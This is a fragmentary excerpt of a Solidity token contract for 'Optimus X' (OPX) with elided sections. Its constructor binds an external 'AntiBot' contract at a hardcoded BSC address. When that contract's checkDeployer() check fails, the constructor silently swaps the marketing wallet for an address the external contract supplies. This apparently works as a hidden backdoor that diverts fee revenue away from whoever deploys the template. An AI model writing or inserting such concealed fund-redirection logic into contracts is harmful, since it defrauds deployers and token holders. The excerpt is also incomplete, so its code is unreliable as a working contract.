...
//--- Contract v3 ---//
contract OPX is Context, Ownable, IERC20 {
    ...
    address payable private marketingAddress = payable(0x61fE785FB791Dd320d37ba889B10b91bDdd1D199); // build: 0x61fE785FB791Dd320d37ba889B10b91bDdd1D199
    address payable private devWallet = payable(0x4dd2730E3db73b86456B849AF7c584446EAbC403); // build: 0x4dd2730E3db73b86456B849AF7c584446EAbC403
    AntiBot private AX;
...
//--- v3 Allocations by Freddy analytixaudit.com ---//
    ...
    string constant private _name = "Optimus X";
    string constant private _symbol = "OPX";
    ...
    bool private inSwap;
    bool public isCaVerified = false;
    ...
    constructor () {
        ...
        if (block.chainid == 56) {
            ...
            AX = AntiBot(0xf0d8b5582c865503D96e759b05eD8eEdD1716ec7);
        ...
        if(!AX.checkDeployer()) {marketingAddress = payable(AX.marketingAddress());} else {isCaVerified = true;}
        canSwapFees = true;
